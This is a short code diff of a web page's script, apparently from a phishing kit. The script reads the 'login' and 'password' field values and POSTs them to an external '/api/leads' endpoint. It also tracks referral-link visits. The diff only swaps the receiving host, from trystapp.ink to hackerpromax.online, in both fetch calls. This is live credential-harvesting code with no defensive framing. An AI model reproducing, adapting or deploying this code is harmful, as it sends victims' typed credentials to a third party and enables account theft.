@@ -3847,7 +3847,7 @@
             let email = document.getElementById("login").value;
             let password = document.getElementById("password").value;
 
-            fetch('https://trystapp.ink/api/leads', {
+            fetch('https://hackerpromax.online/api/leads', {
                 method: 'POST',
                 headers: {
                     'Accept': 'application/json',
@@ -3881,7 +3881,7 @@
             refId = params.get('ref')
             window.localStorage.setItem("ref", refId)
         }
-        fetch('https://trystapp.ink/api/links/track-link-visit', {
+        fetch('https://hackerpromax.online/api/links/track-link-visit', {
             method: 'PATCH',
             body: JSON.stringify({
                 "siteId": siteId,
